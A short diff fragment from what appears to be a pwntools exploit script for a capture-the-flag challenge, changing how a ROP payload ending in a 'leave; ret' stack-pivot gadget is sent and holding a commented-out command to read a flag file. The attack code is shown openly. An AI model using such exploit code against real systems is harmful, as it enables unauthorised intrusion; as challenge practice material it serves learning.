@@ -33,7 +33,7 @@ p = flat(
     leave_ret
 )
 
-y.send(p)
+y.sendafter( '?' , p )
 
 #y.sendline( 'cat /home/`whoami`/flag' )
 
